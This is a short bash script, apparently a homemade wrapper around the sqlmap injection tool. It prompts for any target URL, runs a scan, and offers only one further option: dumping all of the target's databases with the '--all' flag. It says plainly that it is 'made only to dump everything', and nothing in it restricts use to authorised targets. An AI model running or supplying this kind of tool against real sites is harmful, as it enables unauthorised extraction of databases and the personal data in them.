#!/bin/bash
read -e -p "Enter target URL: " URL
sleep 1
echo "a basic scan is required for all options"
sudo sqlmap -u $URL
sleep 2
read -p "Would you like to dump ALL the databases files [y/n]" CONTINUE
case $CONTINUE in
    y|Y) echo "continuing"
    sudo sqlmap -u $URL --all ;;

    n|N) echo "Sorry this tool is made only to dump everything. I have not made it advanced yet"
    sleep 4
    exit ;;
esac

